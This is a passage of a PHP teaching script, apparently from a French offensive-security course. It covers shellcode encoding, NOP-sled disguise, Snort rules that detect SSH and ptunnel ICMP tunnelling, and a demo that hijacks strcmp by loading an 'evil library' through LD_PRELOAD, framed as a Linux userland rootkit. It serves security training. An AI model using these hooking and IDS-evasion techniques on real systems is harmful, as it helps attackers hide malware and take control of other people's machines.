- Coder la routine de décryptage, qui précèdera évidemment le shellcode crypté
Il est obligatoire d’utiliser une clé incrémentée(ou décrémentée) au codage de chaque octet car dans le cas contraire, on risquerait(dans le cas de shellcode de taille moyenne ou grande) d’obtenir des octets NULL. Par exemple, si nous devons encoder les opcodes suivants avec la clé 0x6a, nous obtiendrons un octet NULL, et plus la taille du shellcode augmente, plus le choix de clé d’encodage sera restreint(voire nul).\n");
	$this->article("Camouflage de NOPs", "Une dernière étape afin de rendre notre exploitation le plus invisible possible consiste à remplacer le traditionnel octet 0x90(NOP) – qui n’est d’ailleurs pas dans notre jeu de caractères alphanumérique – par une ou plusieurs instructions d’un octet qui n’auront pas d’incidences sur notre shellcode.");
	$this->pause();
	
	
	/*
	 * Allow ptrace processes
	 * $ sudo sysctl -w kernel.yama.ptrace_scope=0
	 */
	
	// ######################################################################################
	
	// bypass_ids(); // ok inclure dans after
	$this->titre("Outrepasser les NIPS"); // ADD NOPs de metasploit
	$this->net ( "http://www.url-encode-decode.com/" );

	
	
	$file_pcap = "$this->dir_tmp/tunnel_icmp2tcp.pcap";
	$this->pause();
	$this->requette("echo '$this->root_passwd' | sudo -S snort -A console -q -c /etc/snort/snort.conf -r $file_pcap");
	$this->requette("echo 'alert tcp 10.60.10.0/24 any -> any any (msg:\"SSH Connection Attempt\"; flags:A+; content:\"SSH-\"; sid:1000009; rev:1)' | sudo tee /etc/snort/rules/local.rules");
	$this->requette("echo 'alert tcp 10.60.10.0/24 any -> any !22 (msg:\"SSH to Non-standard Port\"; flags:A+; content:\"SSH-\"; sid:1000010; rev:1)' | sudo tee -a /etc/snort/rules/local.rules");
	$this->requette("cat /etc/snort/rules/local.rules");
	$this->requette("grep -i -n 'Port' /etc/ssh/sshd_config");
	$this->requette("echo '$this->root_passwd' | sudo -S snort -A console -q -c /etc/snort/rules/local.rules -r $file_pcap");
	$this->pause();
	$this->todo("enlever la banniere de ssh server ");
	$port = new port("$this->dir_tmp", $this->ub14041, "22");
	$port->port2banner();
	$this->rouge("one specific portion of this data does not change from packet to packet in ptunnel -> d5 20 08 80");
	$this->pause();
	$this->requette("hd $file_pcap | grep 'd5 20 08 80' ");
	$this->requette("echo 'alert icmp 10.60.10.0/24 any -> any any (msg:\" Rohff Ptunnel Proxy Detected\"; content:\"|d5 20 08 80|\"; depth:4; sid:1000011; rev:1;)' | sudo tee -a /etc/snort/rules/local.rules");
	
	$this->requette("echo '$this->root_passwd' | sudo -S snort -A console -q -c /etc/snort/rules/local.rules -r $file_pcap");
	$this->pause();
	
	
	// alert ip any any -> any any (ip_proto: ipip; msg: "IP-IP tunneling detected";)
	// ./tcprelay <localport> <remotehost> <remoteport>
	// ./tcplink <remotehostA> <remoteportA> <remotehostB> <remoteportB>
	
	
	//$this->net("http://malware-traffic-analysis.net");

	}
	
	
	

	function poc4malware4rootkit4linux_ld_preload() {
	
	$this->gtitre("The magic of LD_PRELOAD for Userland Rootkits");
	// aslr_no();
	$this->img("$this->dir_img/bof/ccompilerlinker006.png");
	$this->img("$this->dir_img/bof/compile.gif");
	$this->img("$this->dir_img/bof/memory_layouts_linux.png");
	
	$this->article("LD_PRELOAD", " est une variable d’environnement qui nous permet de spécifier une bibliothèque partagée qui sera chargée au démarrage d’un programme.
	Ceci nous ouvre beaucoup de possibilités dans la manipulation de programmes.");
	$this->cmd("localhost", "man LD");
	$this->remarque("Certains programmes peuvent ne plus fonctionner correctement si certaines fonctionnalités sont remplacées.\n\tAu cas où vous resteriez coincé avec des messages d’erreur en tentant d’exécuter des programmes, exportez alors simplement LD_PRELOAD=\"\" et tout reviendra à la normale. ");
	$this->pause();
	$this->article("LD_PRELOAD", "is an environment variable on Linux systems that is meant to contain the path to a shared library (.so). When set, the given shared library will load before any others, and any functions that it overrides in other libraries will be called instead of the real function. LD_PRELOAD is meant to provide an easy method to debug or inspect functions in dynamically linked libraries without the need to patch or recompile the library itself. Besides the per-process environment variable, the /etc/ld.so.preload  file can be used to preload a library into all processes on the system by simply placing the path of the library to preload into it.
	
Like many other features provided by operating systems, this feature has long been abused (see here from 2005) by security researchers. Due to the ease in which LD_PRELOAD can give malware control over userland processes, many current rootkits, including Jynx, utilize this feature to gain control over the running computer.");
	$this->pause();
	$this->titre("Hijacking syscalls");
	$this->ssTitre("Programme Target");
	//$preload = new bin4linux($file)
	$this->requette("cp -v $this->dir_c/ld_preload_1.c $this->dir_tmp/ld_preload_1.c");
	$file_elf = new file("$this->dir_tmp/ld_preload_1.c");
	$programme = $file_elf->file_c2elf("-m32");

	
	$this->requette("$programme test");
	$this->requette("$programme hacker");
	// requette("dtrace $programme");
	// in case gcc --static -> is not a dynamic executable -> No DLL
	$this->pause();
	$this->img("$this->dir_img/rootkit/hook_function.png");
	$this->ssTitre("Evil librairy");
	$this->requette("cat $this->dir_c/ld_preload_strcmp.c");
	$this->requette("gedit $this->dir_c/ld_preload_strcmp.c");
	$this->requette("gcc -m32 -shared -fPIC -ldl -o $this->dir_tmp/strcmp2.so $this->dir_c/ld_preload_strcmp.c");
	$this->article("Strip", "Reduire la taille de la bibliotheque (man 1 strip), Retirer les symbole inutiles (debugages . . .)
Commande :$ strip -s libXXX.so");
	$this->requette("ldd  $programme");
	$this->requette("$programme test");
	$this->requette("LD_PRELOAD=$this->dir_tmp/strcmp2.so $programme test");
	$this->requette("LD_PRELOAD=$this->dir_tmp/strcmp2.so ldd  $programme");
	$this->pause();
	
	$prog = new bin4linux($programme);
	$fonction = "strcmp";
	$strcmp_original = $prog->elf2addr4fonction_prog($fonction);
	
	$query = "LD_PRELOAD=$this->dir_tmp/strcmp2.so gdb --batch -q -ex \"r AAAA\" -ex \"x/x $fonction\" $programme";
	$filtre = " | tail -1 | cut -d'x' -f2 | cut -d' ' -f1 ";
	$tmp = $this->req_ret_tab($query . $filtre);
	$fonction_addr = trim($tmp [0]);
	unset($tmp);
	$fonction_addr = $this->hex2norme_32($fonction_addr);
	$strcmp_hooked = $fonction_addr;
	$this->article("&$fonction with LD_PRELOAD", $fonction_addr);
	/*
	 * $this->ssTitre("Check Hooking");
	 * $this->article("Detection hooking function","here's a simple detection method that compares the address of syscalls loaded directly from libc, and the \"next\" address to that system call.
	 * By comparing the two values, you can more accurately detect preload based userland rootkits.");
	 *
	 * $programme3 = prog_compile("preloadcheck", "-m32 -ldl ");
	 * requette($programme3);
	 * requette("LD_PRELOAD=$this->dir_tmp/strcmp2.so $programme3");
	 * exec("LD_PRELOAD=$this->dir_tmp/strcmp2.so $programme3 | grep 'Libc address' | tail -1 | grep -Po \"0x[a-f0-9A-F]{4,8}\" ",$tmp);
	 * $strcmp_original = $tmp[0];unset($tmp);
	 *
	 * exec("LD_PRELOAD=$this->dir_tmp/strcmp2.so $programme3 | grep 'Next address' | tail -1 | grep -Po \"0x[a-f0-9A-F]{4,8}\" ",$tmp);
	 * $strcmp_hooked = $tmp[0];unset($tmp);
	 */
	
	$this->ssTitre("Addr Hooked");
	
	$this->requette("LD_PRELOAD=$this->dir_tmp/strcmp2.so gdb --batch -q -ex \"r AAAA\"  -ex \"x/x strcmp\" -ex \"info symbol $strcmp_hooked\" $programme");
	$this->pause();
	
	$this->ssTitre("Who Use LD_PRELOAD");
	$this->net("https://github.com/dex4er/fakechroot/blob/master/man/fakechroot.pod");
	$this->net("https://github.com/chokepoint/azazel");
	$this->net("https://github.com/chokepoint/jynxkit");
	$this->net("https://github.com/chokepoint/Jynx2");
	$this->pause();
	$this->notify("END LD_PRELOAD");
	}
	

	
	
	
	
	
	
}
?>